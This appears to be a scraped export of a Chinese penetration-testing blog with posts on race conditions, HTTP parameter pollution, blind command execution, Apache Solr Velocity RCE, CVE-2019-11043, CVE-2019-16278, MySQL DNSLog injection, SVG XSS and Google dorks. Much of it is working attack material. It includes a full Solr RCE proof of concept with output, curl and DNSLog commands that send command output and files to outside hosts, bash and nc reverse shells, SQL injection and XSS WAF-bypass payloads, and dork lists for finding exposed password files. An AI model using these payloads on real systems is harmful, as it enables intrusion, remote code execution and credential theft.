竞争条件漏洞就是多个进程访问同一资源时产生的时间或者序列的冲突，并利用这个冲突来对系统进行攻击。一个看起来无害的程序如果被恶意攻击者利用，将发生竞争条件漏洞。 0x01 漏洞挖掘 一般挖掘的点： 签到 支付 积分兑换 转账 优惠券 提现 文件上传 绕过数量限制 等。。 0x02 测试流程 基本方法就是，例如在提交订单的时候，抓取包，然后构造脚本，进行多线程并发操作。 0x03 漏洞案例 利用竞争条件实现RCE https://www.freebuf.com/column/215340.html 利用竞争条件实现提权 https://www.jianshu.com/p/7a50d424adb1 0x04 测试技巧使用Burp模块-Inturder选择Payload类型为空，将线程调到50进行多线程异步发包 修复建议 解决方案通常是加“锁”，mysql执行事务前加BEGIN，后加COMMIT，从而锁定一次事务处理，使按序进行： 漏洞防御 对于业务端条件竞争的防范，一般的方法是设置锁； 对于文件上传，一定要经过充分完整的检查之后再上传； 在操作系统的角度，共享数据要进行上锁保护。","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"参数污染漏洞（HPP）挖掘技巧","slug":"渗透测试-参数污染漏洞（HPP）挖掘技巧","date":"2019-11-09T07:30:08.000Z","updated":"2019-11-10T14:44:59.594Z","comments":true,"path":"2019/11/09/渗透测试-参数污染漏洞（HPP）挖掘技巧/","link":"","permalink":"http://www.vkxss.top/2019/11/09/渗透测试-参数污染漏洞（HPP）挖掘技巧/","excerpt":"","text":"参数污染漏洞（HPP）挖掘技巧记录 概念： 漏洞原理： 实战案例总结： 挖掘技巧： 修复方案： 参数污染漏洞（HPP）挖掘技巧记录概念：HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。 漏洞原理： 通过简单的案例可以说明这种处理的差异： 在不同的搜索引擎中进行搜索，在地址栏输入URL：/s?wd=test&amp;wd=test1，这里重复相同搜索参数，观察搜索结果的不同： (1)百度接受第一个参数（test）而放弃第二个参数（test1）： (2)Yahho接受第二个参数（test1）而放弃第一个参数（test）： (3)Google会将两个值都接受，并通过一个空格将两个参数连接起来，组成一个参数： 测试不同服务器对漏洞的处理方法： 对于Flask服务器，取第一个值 对于PHP/Apache服务器，取最后一个值我们以弹窗为例，首先将js代码放在first参数name位置，返回string(3) “222” ，证明取的是最后一个name参数的值。 具体服务端对应的不同处理方式如下 实战案例总结： HPP漏洞的产生原因一方面来自服务器处理机制的不同，另一方面来自开发人员后端检测逻辑的问题。HTTP 参数污染的风险实际上取决于后端所执行的操作，以及被污染的参数提交到了哪里。总体上HPP一般有两种利用场景： 1）逻辑漏洞，通常会造成IDOR，信息泄露，越权等漏洞; 2）作为其他漏洞的辅助，用于绕过漏洞的检测和Waf等。 这里汇总了工作中和国内外遇到的一些典型案例： 1、 逻辑漏洞（IDOR） 1）敏感操作 SilverlightFox中，网站通过URL：https://www.example.com/transferMoney.php?amount=1000&amp;fromAccount=12345进行转账操作，原本链接中是没有toAmount参数的，这个参数是后端固定的，但如果我们重复提交这个参数：toAccount=9876&amp;amount=1000&amp;fromAccount=12345&amp;toAccount=99999第二个 toAccount 参数，会覆盖后端请求，并将钱转账给恶意账户（ 99999 ）而不是由系统设置的预期账户（ 9876 ）。 (2）IDOR（不安全的对象引用） 一般的社交软件都有“关注”或”喜欢”功能，下面就是ID为5318415对5333003进行关注发送的数据包： 按我们通常挖掘逻辑漏洞的思路，我们可以篡改ID值，使对方关注我。这里5318415是我的ID，但将我的actorId替换为对方的ID，会收到“401 Unauthorized”错误，说明此处做了鉴权操作。 但是，如果请求2个actorId参数，第一个actorId参数是目标的actorId。这样5024700（受害者）会关注5318415（我）。这次得到的响应是202 Accepted。 后台对于actorId的鉴权操作是对第二个，关注操作取的却是第一个。所以在测试越权类问题时未果不妨多试一步HPP，下面Twitter案例也是如出一辙：https://twitter.com/i/u?iid=F6542&amp;uid=2321301342&amp;uid=1134885524&amp;nid=22+26 通过添加第二个uid，取消Twitter的邮箱提醒。 3）社交分享链接 不少网站都有社交分享按钮，可以把内容分享到其他社交媒体，如Hackerone的链接为：https://hackerone.com/blog/introducing-signal，分享到FB上链接为： https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal 如果我们将要分享的Hackerone的链接改为：https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov，则最终的跳转会成为： https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov 后一个参数u拥有比第一个更高的优先级，之后会用于 Fackbook 的发布，最终会跳转到恶意站点https://vk.com/durov。 4）页面跳转 一个Digits跳转的案例，跳转链接如下： https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv 如果直接修改参数为http://attacker.com，由于注册域不匹配，因此页面将显示错误，但如果我们使用HPP： https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv&amp;host=http://attacker.com 从而第一个host参数绕过验证，取第二个host参数作为跳转源。 5）权限操作 以下代码： &lt;? $val=htmlspecialchars($_GET[&#39;par&#39;],ENT_QUOTES); ?&gt; 1234567- 以下代码使用par参数取用户输入并生成URL：- http://host/page.php?action=view&amp;par=123- 但用户若输入par为则最终生成的链接为：123&amp;amp;action=edit，则最终的请求则变成：- http://host/page.php?action=view&amp;par=123&amp;amp;action=edit- 通过重复提交action参数，会导致应用接受编辑操作而不是查看操作，实现权限的提升。- 注：&apos;&amp;amp;&apos; = &apos;&amp;&apos; ，在HTML中的&amp;用&amp;amp; 来表示 2、 绕过检测（WAF） 1）SQL绕过1 12345- 一个常见的SQL注入payload如:- http://xxx/horse.php?id=7 union select 1,2,3，current_user- 探测发现网站配置了WAF来阻止任意包含“select”或“union”等常用的SQL查询关键字，通过HPP绕过：- http://xxx/horse.php?id=0&amp;amp;id=7%20union%20select%201,2,3,current_user- 注入语句被写到第二个参数值的位置，不会被waf解析。 2）SQL绕过2 ModSecurity过滤器会将类似于select1,2,3 from table这类的语句归类为黑名单。但是这个web服务器在遇到为同一个参数赋值不同数值时，会采取类似谷歌的处理方式，将参数连接起来，以此来绕过黑名单。例如提交如下的URL： http://xxx/index.aspx?page=select 1&amp;page=2,3 from table 3）Apple Cups的XSS Apple Cups是被许多UNIX系统利用的打印系统。系统对kerberos进行了黑名单过滤，通过前置一个重复参数可以触发xss： http://xxx/?kerberos=onmouseover=alert(1)&amp;kerberos= 这个方法可以绕过系统的验证机制，原因是这个验证系统只采纳了第二个kerberos的值，这个值为空，因此不会触发。而第一个kerberos直到被用于构建动态HTML内容前都没有被验证。最终在web站点的上下文中javascript语句被执行。 4）URL重定向+HPP+XSS 在点击网站的链接时，会将用户重定向到一个页面，链接为： xxx.aspx?dest=http://whitelistedWebsite.com 这容易想到URL重定向漏洞，经过探测，发现dest参数接受的协议有http:// ftp:// http:/ javascript:/，所以尝试构造xss： dest=javascript://alert(document.domain) 发现存在白名单限制，尝试绕过： dest=javascript:/whitelistedWebsite.com/i;alert(document.domain 但分号；会无法解析，导致报错，最终使用HPP绕过： dest=javascript:/whitelistedWebsite.com/i&amp;dest=alert(1) 原理和例1类似，接受两个参数值进行拼接：javascript://alert(1) 挖掘技巧： 根据上面的实战案例总结，在挖掘HPP漏洞的时候，需要注意以下几点： 1、和IDOR漏洞挖掘类似，关注与用户权限紧密相关的参数，有些场景可能防范了IDOR，但重复提交参数可能就会产生奇效； 2、在挖掘其他漏洞的时候，如果进行了检测又无法绕过的情况下，可以尝试通过重复提交参数/参数拼接方式绕过检测。 修复方案： 概括地讲，防范这类攻击的方法有两种： 1、设备层面，让WAF或其他网关设备（比如IPS）在检查URL时，对同一个参数被多次赋值的情况进行特殊处理。由于HTTP协议允许相同参数在URL中多次出现，因此这种特殊处理需要注意避免误杀的情况； 2、代码层面，编写WEB程序时，要通过合理的$_GET方法获取URL中的参数值，而尝试获取web服务器返回给程序的其他值时要慎重处理，结合其他漏洞的产生进行组合排查。","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"无回显代码执行利用方法总结","slug":"渗透测试-无回显代码执行利用方法总结","date":"2019-11-08T07:30:08.000Z","updated":"2019-11-10T04:54:57.610Z","comments":true,"path":"2019/11/08/渗透测试-无回显代码执行利用方法总结/","link":"","permalink":"http://www.vkxss.top/2019/11/08/渗透测试-无回显代码执行利用方法总结/","excerpt":"","text":"0X00 DNSLOG回显 0X01 curl上传文件 0X02 Wget 0X03 反弹shell 0X00 DNSLOG回显 尝试DNSLOG获取回显使用反引号执行代码，并用curl将执行结果返回给DNSLOG 12curl http://dnslog/`whoami`ping `whoami`.dnslog 0X01 curl上传文件 我们可以用 -X POST 来申明我们的请求方法，用 -F “file=@FILE_PATH“ 的请示，传输文件即可。 12345# 利用Burp：curl -X POST -F xx=@/Users/vk/Downloads/1.txt http://a8jmrauzh2kxy56bhk99xwhh78dy1n.burpcollaborator.net -v# 利用NC：curl -X POST -F xx=@/Users/vk/Downloads/1.txt http://127.0.0.1:9999 -v 打开Burp主界面 –&gt;菜单（Burp）–&gt;Burp Collaboraor Client – &gt; 点击 Copy to Clipboard 0X02 Wget wget指定header头查看日志回显 1wget -d --header=&quot;User-Agent: $(cat /etc/passwd|tail -n 1)&quot; http://127.0.0.1/1.php 0X03 反弹shell 用nc返回一个交互式的shell 12345678# 服务器端执行nc -vv -lp 8888# 命令执行处执行bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1# payloadcommand=111%0d%0abash+-i+&gt;%26+/dev/tcp/127.0.0.1/8888+0&gt;%261","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"Apache_Solr_Velocity模板注入RCE漏洞","slug":"渗透测试-Apache_Solr_Velocity模板注入RCE漏洞","date":"2019-10-31T07:30:08.000Z","updated":"2019-11-01T03:31:26.517Z","comments":true,"path":"2019/10/31/渗透测试-Apache_Solr_Velocity模板注入RCE漏洞/","link":"","permalink":"http://www.vkxss.top/2019/10/31/渗透测试-Apache_Solr_Velocity模板注入RCE漏洞/","excerpt":"","text":"0x00 前言 0x01 漏洞详情 0x02 POC 0x03 复现 0x00 前言 Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。 r是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。 0x01 漏洞详情 该漏洞的产生原因： 1、攻击者可以直接访问solr admin页面,并可以通过构造post请求来修改节点的配置. 2.Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。 3、当params.resource.loader.enabled设置为true，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个恶意的请求，在服务器上进行命令执行,从而获取服务器的权限。 0x02 POC123456789101112131415161718192021222324252627282930313233343536373839404142来自：https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt Apache Solr RCE via Velocity templateSet &quot;params.resource.loader.enabled&quot; as true.Request:========================================================================POST /solr/test/config HTTP/1.1Host: solr:8983Content-Type: application/jsonContent-Length: 259&#123; &quot;update-queryresponsewriter&quot;: &#123; &quot;startup&quot;: &quot;lazy&quot;, &quot;name&quot;: &quot;velocity&quot;, &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;, &quot;template.base.dir&quot;: &quot;&quot;, &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;, &quot;params.resource.loader.enabled&quot;: &quot;true&quot; &#125;&#125;========================================================================RCE via velocity templateRequest:========================================================================GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1Host: localhost:8983========================================================================Response:========================================================================HTTP/1.1 200 OKContent-Type: text/html;charset=utf-8Content-Length: 56 0 uid=8983(solr) gid=8983(solr) groups=8983(solr)========================================================================0x03 复现 环境搭建 1234下载最新的Solr下载地址:https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.zip解压以后,进入solr-8.2.0/bin目录使用./solr -e dih -force开启示例app payload: 12/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end注意：漏洞需要Content-Type为application/json 反弹shell： 可以反弹shell，使用nc命令： nc -e /bin/bash ip port成功反弹shell","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"CVE-2019-11043-PHP远程代码执行漏洞复现","slug":"CVE-2019-11043","date":"2019-10-25T07:30:08.000Z","updated":"2019-11-01T05:22:25.327Z","comments":true,"path":"2019/10/25/CVE-2019-11043/","link":"","permalink":"http://www.vkxss.top/2019/10/25/CVE-2019-11043/","excerpt":"","text":"0X00 简介 0X01 CVE编号 0X02 漏洞威胁等级 0X03 影响范围 0X04 漏洞复现 0X05 漏洞总结 0X06 Reference 0X00 简介 9 月 26 日，安全研究员 Andrew Danau向PHP 提交一枚远程代码执行漏洞，使用某些特定配置的Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。该漏洞EXP于10月22日公开。原因是：Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \\n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。 0X01 CVE编号 CVE-2019-11043 0X02 漏洞威胁等级 高危 0X03 影响范围 Nginx+ php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。 1234567location ~ [^/]\\.php(/|$) &#123; fastcgi_split_path_info^(.+?\\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ... &#125;&#125; 0X04 漏洞复现 在EXP公布的时候，vulhub也发布了相应的镜像，本次实验使用该镜像进行复现。 https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043 将文件下载下来之后，搭建环境: docker-compose up -d Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。 详情参考Reference 0X05 漏洞总结 利用条件苛刻，因为触发漏洞的配置不是默认配置。 即使是触发漏洞的配置，仍有失败的机率，执行命令时成功率50%的样子。 0X06 Reference 参考链接：https://github.com/vkbiu/CVE/tree/master/CVE-2019-11043","categories":[{"name":"CVE-2019","slug":"CVE-2019","permalink":"http://www.vkxss.top/categories/CVE-2019/"}],"tags":[{"name":"CVE-2019-16759","slug":"CVE-2019-16759","permalink":"http://www.vkxss.top/tags/CVE-2019-16759/"}]},{"title":"google_hack语法","slug":"渗透测试-google_hack语法","date":"2019-10-24T04:25:40.000Z","updated":"2019-12-12T07:58:26.878Z","comments":true,"path":"2019/10/24/渗透测试-google_hack语法/","link":"","permalink":"http://www.vkxss.top/2019/10/24/渗透测试-google_hack语法/","excerpt":"","text":"google hack语法 简介在日站的时候google搜索能让我们获得意想不到的信息，可以找到目标站点的敏感信息。后台等等 google hack语法列表初级语法表 123456789模糊搜索-例如：卢本伟精确搜索-例如：\"卢本伟\"通配符*-例如：何安圻*通配符.-例如：大岭山中学. PS:.的通配符用于匹配字符布尔逻辑-例如：大岭山中学 and 何安圻逻辑或|-例如：绿盟 (郑州)逻辑非-例如：何安圻 -博客园约束条件-例如：黎颖希 +获奖数字范围-例如：绿盟+2009年 2015年 高级语法表 12345678910访问基本信息-例如：info:baidu.com标题搜索-例如：intitle:后台登录正文搜索-例如：intext:身份证大全url搜索-例如：inurl:google.com锚链链接搜索-例如：inanchor:google文档类型限定搜索-例如：intext:身份证大全 filetype:xls缓存搜索-l例如：cache:secqun.org相关网址搜索-例如：related:google hacking相关连接搜索-例如：link:baidu.com与指定域名相关的搜索：site:baidu.com 高级利用 123456inurl:robots.txtintitle:登录 intext:username inurl:login.jspinurl:8080 inurl:jspfiletype:sql site:com and \"insert into admin 2014\"inurl:jsp/demo.jspinurl:update set inurl:where 渗透利用： 1234567891011121314151617181920212223242526272829“Login: ” “password =” filetype: xls ( 搜索存储在excel文件中含有password的数据)。allinurl: auth_user_file.txt (搜索包含在服务器上的 auth_user_file.txt 的文件）。filetype: xls inurl: “password.xls” (查找 用户名和密码以excel格式）这个命令可以变为“admin.xls”.intitle: login password (获取登陆页面的连接，登陆关键词在标题中。)intitle: “Index of” master.passwd (密码页面索引)index of / backup ( 搜索服务器上的备份文件）intitle: index.of people.lst (包含people.list的网页）intitle: index.of passwd.bak ( 密码备份文件)intitle: “Index of” pwd.db (搜索数据库密码文件).intitle: “Index of .. etc” passwd (安装密码建立页面索引）.index.of passlist.txt (以纯文本的形式加载包含passlist.txt的页面).index.of.secret (显示包含机密的文档，.gov类型的网站除外) 还可以使用: index.of.privatefiletype: xls username password email (查找表格中含有username和password的列的xls文件).”# PhpMyAdmin MySQL-Dump” filetype: txt (列出包含敏感数据的基于php的页面)inurl: ipsec.secrets-history-bugs (包含只有超级用户才有的敏感数据). 还有一种旧的用法 inurl: ipsec.secrets “holds shared secrets”inurl: ipsec.conf-intitle: manpageinurl: “wvdial.conf” intext: “password” (显示包含电话号码，用户名和密码的连接。）inurl: “user.xls” intext: “password” (显示用户名和密码存储在xls的链接。)filetype: ldb admin (web服务器查找存储在数据库中没有呗googledork删去的密码。）inurl: search / admin.php (查找admin登陆的php页面). 如果幸运的话，还可以找到一个管理员配置界面创建一个新用户。inurl: password.log filetype:log (查找特定链接的日志文件。)filetype: reg HKEY_CURRENT_USER username (在HCU (Hkey_Current_User)路径中查找注册表文件(registyry)。)“Http://username: password @ www …” filetype: bak inurl: “htaccess | passwd | shadow | ht users”(查找备份文件中的用户名和密码。)filetype:ini ws_ftp pwd (通过ws_ftp.ini 文件查找admin用户的密码)intitle: “Index of” pwd.db (查找加密的用户名和密码）inurl:admin inurl:backup intitle:index.of (查找关键词包含admin和backup的目录。)“Index of/” “Parent Directory” “WS _ FTP.ini” filetype:ini WS _ FTP PWD (WS_FTP 配置文件， 可以获取FTP服务器的进入权限)ext:pwd inurl:(service|authors|administrators|users) “# -FrontPage-”filetype: sql ( “passwd values *” |” password values *” | “pass values **“) 查找存储在数据库中的sql代码和密码。 )","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"Mysql-Dnslog盲注","slug":"渗透测试-Mysql-Dnslog盲注","date":"2019-10-21T06:25:40.000Z","updated":"2019-10-21T17:01:56.359Z","comments":true,"path":"2019/10/21/渗透测试-Mysql-Dnslog盲注/","link":"","permalink":"http://www.vkxss.top/2019/10/21/渗透测试-Mysql-Dnslog盲注/","excerpt":"","text":"0x00 为什么用Dnslog盲注 0x01 利用条件 0x02 如何查看mysql是否开启了文件导入导出？ 0x03 构造攻击Payload 0X04 Reference 0x00 为什么用Dnslog盲注 对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现注入。 0x01 利用条件 数据库的load_file函数必须可用，也就是数据库用户必须要有file_priv权限 其次就是mysql的secure_file_priv不为NULL,有些高版本的mysql中的secure_file_priv默认为NULL secure_file_priv特性secure_file_priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。 0x02 如何查看mysql是否开启了文件导入导出？ 在MySQL 5.5.53版本之前，这个变量默认为空，因此我们就可以使用这些函数。但是在该版本之后，NULL值会禁用这些函数。我们可使用其中的一种方法来检查这个变量的值。Secure_file_priv是一个全局变量且是一个只读变量，也就是说在运行时无法更改。 使用如下命令查看： mysql&gt;show global variables like ‘%secure%’; secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出。 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下。 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制。 总结下如何修改secure_file_priv的值？ windows下：修改my.ini 在[mysqld]内加入secure_file_priv = linux下：修改my.cnf 在[mysqld]内加入secure_file_priv = MYSQL新特性secure_file_priv对读写文件的影响 然后重启mysql，再查询secure_file_priv 0x03 构造攻击Payload 普通payload： 123456select load_file(concat(&apos;\\\\\\\\&apos;,(select database()),&apos;.xxxx.ceye.io\\\\abc&apos;))concat是字符串拼接；用4个,因为\\\\会被转义为:\\database()就是你要做SQL注入查询的地方&apos;.xxxx.ceye.io\\abc&apos;就是你的dnslog平台给你的域名unc路径 网络共享文件方式 \\\\dnslog\\abc这样的路径 - 上面拼接的结果就是&quot;\\\\\\\\ schema_name.dnslog\\\\abc&quot;，其实相当于访问了带有数据库名称的三级域名，被dnslog捕获到了。 加密payload 利用bur or select hex(“要加密的数据”)即可. 1234加密前： select load_file(concat(&quot;\\\\\\\\&quot;,version(),&quot;.dnslog\\\\abc&quot;));16进制加密后： select load_file(concat(0x5c5c5c5c,version(),0x6xxf62312e7xxb2e307xx36363xx63635c5c616263)); 读配置文件payload 这里构造下payload读取：C:\\phpStudy\\WWW\\phpinfo.php 12345678910111213首先select hex(&apos;C:\\\\phpStudy\\\\WWW\\\\phpinfo.php&apos;)得到加密字符串:433A5C70687053747564795C5757575C706870696E666F2E706870然后构造下payload:select load_file(concat(0x5c5c5c5c,(select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870)),0x6f6xxxxxx6b2e307xx363xxxxxc5c616263)); //这里用了两个load_file就解决上面所说的问题了。但是你觉得会成功吗 no no no因为文件带有换行符这是不符合 域名规范的 那么我们怎么办呢 加密数据咯用hex() 继续构造payload:select load_file(concat(0x5c5c5c5c,hex((select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870))),0x6f6f62xxxx66b2xxx78636xxxx5c5c616263)); 复现如下图： 0X04 Reference- 参考链接： https://xz.aliyun.com/t/3992#toc-1 https://www.freebuf.com/articles/web/201013.html https://www.t00ls.net/thread-44273-1-1.html","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"nostromo nhttpd 路径遍历漏洞","slug":"CVE-2019-16278","date":"2019-10-17T07:30:08.000Z","updated":"2019-10-17T07:32:00.814Z","comments":true,"path":"2019/10/17/CVE-2019-16278/","link":"","permalink":"http://www.vkxss.top/2019/10/17/CVE-2019-16278/","excerpt":"","text":"0X00 简介 0X01 CVE编号 0X02 漏洞威胁等级 0X03 影响范围 0X04 漏洞描述 0X05 漏洞POC 0X06 漏洞复现 0X07 修复建议 0X08 Reference 0X00 简介 nostromo nhttpd是一款开源的Web服务器。 nostromo nhttpd 1.9.6及之前版本中的‘http_verify’函数存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。 0X01 CVE编号 CVE-2019-16278 0X02 漏洞威胁等级 高危 0X03 影响范围 nostromo nhttpd &lt;= 1.9.6 0X04 漏洞描述 nostromo nhttpd 1.9.6及之前版本中的‘http_verify’函数存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。 0X05 漏洞POC CVE-2019-16278.sh 12345678POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0Connection: closeUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0Content-Length: 25 echo echo ifconfig 2&gt;&amp;1 0X06 漏洞复现 记录一下，请参考： https://github.com/vkbiu/CVE/tree/master/CVE-2019-16278 0X07 修复建议 上waf或防火墙配置规则拦截,等待官方修复打补丁。 0X08 Reference 参考链接： http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201910-807 https://git.sp0re.sh/sp0re/Nhttpd-exploits","categories":[{"name":"CVE-2019","slug":"CVE-2019","permalink":"http://www.vkxss.top/categories/CVE-2019/"}],"tags":[{"name":"CVE-2019-16278","slug":"CVE-2019-16278","permalink":"http://www.vkxss.top/tags/CVE-2019-16278/"}]},{"title":"SVG-XSS","slug":"渗透测试-SVG-XSS","date":"2019-10-11T07:30:08.000Z","updated":"2019-10-11T10:38:58.307Z","comments":true,"path":"2019/10/11/渗透测试-SVG-XSS/","link":"","permalink":"http://www.vkxss.top/2019/10/11/渗透测试-SVG-XSS/","excerpt":"","text":"SVG-XSS 介绍 SVG文件 Xss Payload SVG-XSS介绍 跨站点脚本（XSS）是一个非常常见的漏洞，涉及在网页中注入javascript代码。从窃取用户Cookie到通过CORS绕过SOP，此漏洞可用于执行各种操作。有许多方法可以定位XSS漏洞，通常会忽略SVG文件。 SVG文件 可缩放矢量图形（SVG）是用于二维图形的基于XML的矢量图像格式，并支持交互性和动画。 以下代码是基本SVG文件的示例： 123&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;&lt;/svg&gt; SVG文件还支持嵌入式javascript代码。例如，开发人员可能在svg图像中使用javascript，以便他们可以实时进行操作。这可以用于动画和其他任务。 要注意的另一件事是，SVG文件可以视为HTML中的图像。这意味着您可以将SVG文件放置在图像标签中，并且可以完美呈现： 1&lt;img src=&quot;rectangle.svg&quot; alt=&quot;Rectangle&quot; height=&quot;42&quot; width=&quot;42&quot;&gt; Xss Payload 如果网站使用XSS有效负载加载SVG文件，则将执行该文件。开发人员和攻击者都经常忽视这一点。以下是带有警报XSS有效负载的SVG文件示例： 123456789&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt; &lt;script type=&quot;text/javascript&quot;&gt; alert(&quot;SVG XSS&quot;); &lt;/script&gt;&lt;/svg&gt; 上传时，注意内容类型设置为：Content-Type: image/svg+xml 上传图像后，您只需找出图像上载到的路径即可。如果您使用的是Google chrome，则可以通过右键单击图片并选择“复制图片地址”来轻松完成此操作。如果在查看图像时一切正常，则将执行有效负载。您只是通过SVG文件存储了XSS。","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"接口快速测试小技巧(Python)","slug":"Python-接口快速测试小技巧(Python)","date":"2019-10-11T07:30:08.000Z","updated":"2019-11-15T09:10:30.260Z","comments":true,"path":"2019/10/11/Python-接口快速测试小技巧(Python)/","link":"","permalink":"http://www.vkxss.top/2019/10/11/Python-接口快速测试小技巧(Python)/","excerpt":"","text":"接口快速测试小技巧(Python) 终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，不只是支持python，而且还支持多种编程语言转换。🐂🍺 